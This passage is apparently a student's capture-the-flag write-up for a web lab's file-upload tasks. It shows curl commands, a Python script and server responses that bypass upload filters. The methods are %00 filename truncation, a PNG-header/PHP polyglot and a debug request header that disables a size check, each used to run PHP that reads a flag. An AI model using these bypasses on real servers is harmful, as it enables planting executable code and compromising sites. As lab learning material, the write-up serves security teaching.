The task title ("Special Characters are so special!") and hint #1 ("some servers strip or ignore certain special characters, altering the file name after processing") point to a specific class of bug: **the server checks one version of the filename but saves a different one**. It validates the name as-received, but then strips/trims certain characters before writing to disk – so a name that passes validation might get transformed into an executable `.php` on disk.

The most classic version, and the one hint #1 describes almost verbatim, is a **trailing character that gets stripped**. Think `shell.php.` (trailing dot) or `shell.php ` (trailing space) or `shell.php.jpg` variants. The validator sees a "safe-looking" or non-`.php` final extension, accepts it, then the server (or the OS/filesystem) strips the trailing junk, leaving `shell.php`.

Rather than guess which character, let's probe systematically. Let's start with the single most common one that fits hint #1 exactly: a trailing dot after `.php`. On many misconfigured stacks the validator does something like "reject if the extension equals php", and `php.` isn't equal to `php` – but the filesystem/normalization drops the trailing dot on save.

```bash
curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task2/ -F "file=@shell2.php;filename=shell.php.;type=image/png"
# HTTP/1.1 400 BAD REQUEST
# Server: nginx/1.22.1
# Date: Mon, 27 Jul 2026 10:41:58 GMT
# Content-Type: application/json
# Content-Length: 35
# Connection: keep-alive
# 
# {"error":"File type not allowed."}
```

Trailing dot rejected – same 400. Good, that rules out one variant and tells us the filter isn't fooled by a simple trailing dot. Let's keep probing methodically, one character class at a time, reading each response.

Before we spend many requests guessing blindly, though, it's worth being smarter about what the filter is actually doing. Right now we know two things get rejected: `shell.php` and `shell.php.`. The task hints heavily at null bytes (hint #2 literally shows `payload.php%00.jpg`). The null-byte trick works when the server does its type-check on the full string (sees a safe `.jpg` ending → allows it) but a lower layer treats the null byte (`\0`) as a string terminator and truncates the name to `shell.php` when saving. This is the textbook "special character" upload bypass, and it's exactly what the title is nudging us toward.

The subtlety with null bytes over HTTP: you can't just type `%00` into curl's `-F filename=` and have it become a real null byte – curl sends the literal characters `%`, `0`, `0`. We need to inject an **actual `\0` byte** into the `Content-Disposition` filename. Let's do that.

```bash
curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task2/ \
  -F $'file=@shell2.php;filename=shell.php\x00.png;type=image/png'

# HTTP/1.1 400 BAD REQUEST
# Server: nginx/1.22.1
# Date: Mon, 27 Jul 2026 10:48:14 GMT
# Content-Type: application/json
# Content-Length: 35
# Connection: keep-alive
# 
# {"error":"File type not allowed."}
```

- `-F $'...'` – the `$'...'` is **bash ANSI-C quoting**. Inside it, `\x00` is interpreted by bash into a **real null byte (0x00)**, not the literal text `%00` or `\x00`. This is how we smuggle an actual null into the filename field.

- Still 400.

- Rather than continue blind, let's do two cheap, high-information things. First, let's confirm what the server does accept – upload a legit .png-named file. That tells us the allowlist is extension-based and gives us a success baseline to compare against (success message format, stored path pattern). Knowing exactly what a pass looks like sharpens every subsequent attempt.

```bash
curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task2/ -F "file=@shell2.php;filename=test.png;type=image/png"

# HTTP/1.1 200 OK
# Server: nginx/1.22.1
# Date: Mon, 27 Jul 2026 11:01:18 GMT
# Content-Type: application/json
# Content-Length: 63
# Connection: keep-alive
# 
# {"message":"'/static/upload/test.png' uploaded successfully."}
```

- Same endpoint and `file` field. Our payload bytes are still PHP, but we name it `test.png`.
- `;filename=test.png` – presents a clean, single .png extension that should sail through an image allowlist.

**Result**

- Content isn't checked at all. We uploaded PHP bytes named `test.png` and it succeeded and stored `/static/upload/test.png`. So the filter is purely **name-based on the extension** – no magic-byte/content sniffing. Our entire problem is making the extension look allowed while the file still executes as PHP.
- Same storage pattern: `/static/upload/<name>`, and it preserved the name exactly (`test.png` → `test.png`). So whatever filename passes validation is (apparently) what lands on disk – meaning we can't rely on the server stripping something after the check (we tested trailing dot / null byte, both rejected at the check stage).

Let's give a try with this python script.

```py
#!/usr/bin/env python3

import requests

url = "http://web0x05.hbtn/api/task2/"
headers = {"Host": "test-s3.web0x05.hbtn"}

payloads = [
    "shell2.php\x00.png",
    "shell2.php%00.png",
]

with open("shell2.php", "rb") as source:
    content = source.read()

for name in payloads:
    files = {
        "file": (
            name,
            content,
            "image/png",
        )
    }

    response = requests.post(
        url,
        headers=headers,
        files=files,
        timeout=10,
    )

    print(repr(name), "=>", response.status_code, response.text)
```


```bash
./test2.py

# 'shell2.php\x00.png' => 200 {"message":"'/static/upload/shell2.php.png' uploaded successfully."}

# 'shell2.php%00.png' => 200 {"message":"'/static/upload/shell2.php' uploaded successfully."}
```

- `shell2.php\x00.png` (a real null byte) → stored as `shell2.php.png`. The server "sanitized" the raw null by... turning the whole thing into `shell2.php.png` (or stripping the null and keeping both extensions). Passes the check, but lands as `.png` – not directly executable, and not what we want.
- `shell2.php%00.png` (the literal text `%00`) → stored as `shell2.php`! This is the winner. Here's the mechanism: the validator receives the string `shell2.php%00.png`, and its type-check sees the name ends in `.png` → allowed. But then something in the pipeline URL-decodes `%00` into a real null byte, and a lower layer treats that null as a string terminator, truncating the saved name to `shell2.php`. Classic null-byte truncation – except the injection vector is the literal percent-encoded `%00`, decoded server-side, rather than a raw null in the multipart header.

Alternatively uploading the php with curl:

```bash
curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task2/ -F "file=@shell2.php;filename=pwn.php%00.png;type=image/png"
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Mon, 27 Jul 2026 13:31:35 GMT
Content-Type: application/json
Content-Length: 62
Connection: keep-alive

{"message":"'/static/upload/pwn.php' uploaded successfully."}
```


We now have our PHP payload sitting at `/static/upload/pwn.php` – real `.php`, and we know from Task 1 that this directory executes PHP. Let's request it and collect the flag.



```bash
curl -s http://test-s3.web0x05.hbtn/static/upload/pwn.php
# f20b1ce7281e892618ce1d4572004c8f
```

Save and check the flag.

```bash
echo f20b1ce7281e892618ce1d4572004c8f > 2-flag.txt

cat 2-flag.txt

git add .
git commit -m "2-flag.txt"
git push
```

---

## 3. What mystery the Magic Numbers Hide ?

With client-side and basic server-side restrictions behind you, the challenge now escalates to bypassing server-side validation that inspects the content of uploaded files, specifically through magic numbers.
Magic numbers are unique values at the beginning of files that identify the file format to the system.

This task involves manipulating an uploaded file's magic numbers to pass it off as a benign type while maintaining its malicious functionality.
Successfully fooling the server's content inspection will reveal another hidden `Flag` ⛳️.

- Main Domain: http://[vuln-subdomain].web0x05.hbtn/task3

You will need to use this php command to read the flag: `<?php readfile('FLAG_3.txt') ?>`, FLAG will only be generated if you upload a php file!

**Useful Instructions**

1. Research and understand the concept of magic numbers in file formats. Identify the magic numbers for both the file type you intend to upload and a benign file type that is allowed by the server.
2. Craft a file that begins with the magic numbers of an allowed file type but contains payload or code typical of a restricted file type. Tools like hex editors can help you modify the file content directly.
3. Test your crafted file by attempting to upload it through the application's upload feature. Pay close attention to how the application responds to determine if your bypass was successful.
4. If direct modification of magic numbers does not yield success, consider more advanced techniques such as embedding your malicious payload within a benign file in a way that does not affect the file's ability to pass as the benign type but still allows execution of the payload under certain conditions.

---

First, confirm task3's API base.

```bash
curl -s http://test-s3.web0x05.hbtn/task3 | grep -oE 'data-url="[^"]*"'
# data-url="/api/task3/"
```

Let's make sure our payload is correct for this task, then POST it.

```bash
printf "%s" "<?php readfile('FLAG_3.txt') ?>" > shell3.php

cat shell3.php
#<?php readfile('FLAG_3.txt') ?>

curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task3/ -F "file=@shell3.php;filename=test.png;type=image/png"

# {"error":"File type not allowed or does not meet the criteria."}
```

Now let's see what a genuine image looks like when accepted – this gives us the success baseline and confirms which magic bytes satisfy the check. Let's craft a minimal valid PNG and upload it (named as a normal `.png`, pure image content).

```bash
printf '\x89PNG\r\n\x1a\n' > real.png

curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task3/ -F "file=@real.png;filename=real.png;type=image/png"

# HTTP/1.1 200 OK
# Server: nginx/1.22.1
# Date: Mon, 27 Jul 2026 13:49:35 GMT
# Content-Type: application/json
# Content-Length: 63
# Connection: keep-alive
# 
# {"message":"'/static/upload/real.png' uploaded successfully."}
```

- `printf '\x89PNG\r\n\x1a\n' > real.png` – writes the 8-byte PNG signature (magic number): `89 50 4E 47 0D 0A 1A 0A`. This is the exact byte sequence every PNG file starts with, and it's what a magic-number check looks for. (It's not a complete valid PNG image, but many naive content checks only inspect the leading signature bytes – we're testing whether that's enough.)
- `-F "file=@real.png;filename=real.png;type=image/png"` – upload it with a clean `.png` name and image MIME.

**Result**

The bare 8-byte PNG signature was accepted. That tells us the content check is shallow: it only inspects the leading magic bytes, not the full image structure (no `getimagesize()`, no real decoder). So our polyglot doesn't need to be a valid image at all – it just needs to start with **`\x89PNG\r\n\x1a\n`** and then carry our PHP.

Now we combine everything we've learned across all three tasks:

- **Content check (task3)**: satisfied by leading PNG magic bytes.
- **Name check (task2)**: `.php` in the final position is rejected, but the `%00` truncation trick lands the file as executable `.php`.
- Execution: files in `/static/upload/` run as PHP.

So the winning file is: **PNG magic number** + **PHP payload**, uploaded with a `%00`-truncation filename so it saves as `.php`. Let's build it.

```bash
printf '\x89PNG\r\n\x1a\n<?php readfile("FLAG_3.txt"); ?>' > poly.php

xxd poly.php | head
# 00000000: 8950 4e47 0d0a 1a0a 3c3f 7068 7020 7265  .PNG....<?php re
# 00000010: 6164 6669 6c65 2822 464c 4147 5f33 2e74  adfile("FLAG_3.t
# 00000020: 7874 2229 3b20 3f3e                      xt"); ?>
```

The hex confirms a clean polyglot: it starts with exactly `8950 4e47 0d0a 1a0a` (the PNG magic number), immediately followed by` <?php readfile("FLAG_3.txt"); ?>`. The content check will see PNG; PHP will execute the code. Now we upload it with the `%00`-truncation filename so it also beats the name filter and lands as executable `.php`.

```bash
curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task3/ -F "file=@poly.php;filename=poly.php%00.png;type=image/png"
# HTTP/1.1 200 OK
# Server: nginx/1.22.1
# Date: Mon, 27 Jul 2026 14:01:28 GMT
# Content-Type: application/json
# Content-Length: 63
# Connection: keep-alive
# 
# {"message":"'/static/upload/poly.php' uploaded successfully."}
```

Now execute the php

```bash
curl -s http://test-s3.web0x05.hbtn/static/upload/poly.php
# �PNG
# 
# ec648cc8d3e91ebb41e347dbb94aa452


# clean the output with strings
curl -s http://test-s3.web0x05.hbtn/static/upload/poly.php | strings

# ec648cc8d3e91ebb41e347dbb94aa452
```

Save and check the flag.

```bash
echo ec648cc8d3e91ebb41e347dbb94aa452 > 3-flag.txt

cat 3-flag.txt

git add .
git commit -m "3-flag.txt"
git push
```

---


## 4. Does File Length matter ?

This sophisticated security measure aims to prevent the upload of potentially malicious files by imposing a strict limit on the file size.
Your objective is to bypass this restriction and successfully upload a file that exceeds the server-imposed limit, revealing a hidden `Flag` ⛳️ as a marker of your success.


- Main Domain: http://[vuln-subdomain].web0x05.hbtn/task4

There is also a another backdoor, just take a look at the response headers  \
You will need to use this php command to read the flag: `<?php readfile('FLAG_4.txt') ?>`,  \
FLAG will only be generated if you upload a php file!

**Useful Instructions**

1. Begin by understanding the server's file length restrictions. Attempt to upload files of varying sizes to pinpoint the exact limit imposed by the server-side validation.
2. Explore compression techniques or file manipulation methods that can reduce the apparent size of your payload without compromising its functionality. Consider formats that support compression natively and can be decompressed by the application or server.
3. Investigate alternative upload methods provided by the application that might not enforce the same file length checks as the primary upload feature. This could include APIs, legacy upload forms, or other indirect file submission functionalities.
4. Leverage tools like Burp Suite to intercept and modify upload requests, experimenting with ways to either compress your payload further or trick the server into misjudging the file size (e.g., by manipulating HTTP headers related to content length).

---

Let's confirm the endpoint and, more importantly, inspect the response headers on the task4 API.

```bash
curl -s -D - http://test-s3.web0x05.hbtn/task4 -o /dev/null
echo "=== now the API endpoint headers ==="
curl -s -D - http://test-s3.web0x05.hbtn/api/task4/ -o /dev/null

# HTTP/1.1 200 OK
# Server: nginx/1.22.1
# Date: Mon, 27 Jul 2026 16:18:16 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 494
# Connection: keep-alive

# === now the API endpoint headers ===

# HTTP/1.1 405 METHOD NOT ALLOWED
# Server: nginx/1.22.1
# Date: Mon, 27 Jul 2026 16:18:16 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 153
# Connection: keep-alive
# Allow: OPTIONS, POST
```

- `curl -s -D - <url> -o /dev/null` – `-D -` dumps the response headers to stdout (the `-` means "write headers here"), while `-o /dev/null` throws away the body. So we see only headers, cleanly. We do this for both the task4 page and its API base.

**Response**

The `/task4` page headers look ordinary (just a 494-byte shell like the others). The API base returned **405 Method Not Allowed** to our GET, with `Allow: OPTIONS, POST` – so the API only speaks POST (and OPTIONS) here, nothing exotic in these headers yet.

But the hint says "just take a look at the response headers" for the **backdoor** – and the most informative headers usually come back on the **actual upload response** (the POST), not on a bare GET. So far we've only looked at GET responses. Let's do a real upload attempt to task4 and inspect its response headers closely – that's where a custom `X-` header pointing to the backdoor is most likely to appear.

Let's send our polyglot (which already beats content + name checks) and read the full response headers.

```bash
printf '\x89PNG\r\n\x1a\n<?php readfile("FLAG_4.txt"); ?>' > poly4.php
curl -s -D - -o /dev/null -X POST http://test-s3.web0x05.hbtn/api/task4/ -F "file=@poly4.php;filename=poly4.php%00.png;type=image/png"

# HTTP/1.1 400 BAD REQUEST
# Server: nginx/1.22.1
# Date: Mon, 27 Jul 2026 16:27:15 GMT
# Content-Type: application/json
# Content-Length: 46
# Connection: keep-alive
# X-Debug-Mode: False
```

There's the backdoor header: **`X-Debug-Mode: False`**. That's not a standard header – the server is volunteering that it has a "debug mode," currently off. The obvious implication: if we can turn it on (by sending `X-Debug-Mode: True` as a **request** header), the server may relax its restrictions – most likely the file-size check this task is about. That's the "backdoor" the hint promised.

Also note the upload came back **400** – let's see the body to confirm it's a size rejection (we discarded it last time). Let's do two things in one shot: read the rejection body, and immediately test flipping debug mode on.

```bash
echo "=== normal POST, show body ===\n"

curl -s -X POST http://test-s3.web0x05.hbtn/api/task4/ -F "file=@poly4.php;filename=poly4.php%00.png;type=image/png"

echo; echo "=== with X-Debug-Mode: True ===\n"

curl -s -i -H "X-Debug-Mode: True" -X POST http://test-s3.web0x05.hbtn/api/task4/ -F "file=@poly4.php;filename=poly4.php%00.png;type=image/png"

# === normal POST, show body ===

# {"error":"File size not allowed (min: 80KB)"}

# === with X-Debug-Mode: True ===

# HTTP/1.1 200 OK
# Server: nginx/1.22.1
# Date: Mon, 27 Jul 2026 16:35:27 GMT
# Content-Type: application/json
# Content-Length: 70
# Connection: keep-alive
# X-Debug-Mode: False

# {"message":"'/static/upload/poly4.php00.png' uploaded successfully."}
```

Two big discoveries here:

1. **The size limit is a minimum, not a maximum!** The error says `File size not allowed (min: 80KB)`. The "restriction" isn't that files are too big, it's that they must be **at least 80KB**. Our tiny ~40-byte polyglot was rejected for being too small. That's the real trick the task's misleading "file length" framing hides.

2. **`X-Debug-Mode: True`** bypassed the size check. With that header, the upload returned 200 – the size gate was skipped entirely (even though the response header still cosmetically shows `X-Debug-Mode: False`). So the backdoor works: debug mode disables the minimum-size enforcement.

- **+1 problem**: file saved as **`poly4.php00.png`** – not executable PHP. Look closely: the `%00` in the filename got decoded to... nothing useful here; the null-truncation that worked in tasks 2–3 didn't truncate this time (the `%` and null handling differs, and it collapsed to `php00.png`). So the file is on disk but as a `.png`-ish name that won't run as PHP. We need it to land as `poly4.php`.

Let's give it a try, maybe the debug mode relaxes the `.php` extension as well.

```bash
curl -s -i -H "X-Debug-Mode: True" -X POST http://test-s3.web0x05.hbtn/api/task4/ -F "file=@poly4.php;filename=poly4.php;type=image/png"                             

# HTTP/1.1 200 OK
# Server: nginx/1.22.1
# Date: Mon, 27 Jul 2026 16:52:00 GMT
# Content-Type: application/json
# Content-Length: 64
# Connection: keep-alive
# X-Debug-Mode: False
# 
# {"message":"'/static/upload/poly4.php' uploaded successfully."}
```

Clean landing. Let's collect our reward

```bash
curl -s http://test-s3.web0x05.hbtn/static/upload/poly4.php | strings

# c4edd85ac9ca845e0ce9f40b1543def3
```

Save flag and check it.

```bash
echo c4edd85ac9ca845e0ce9f40b1543def3 > 4-flag.txt

git add .
git commit -m "4-flag.txt"
git push
```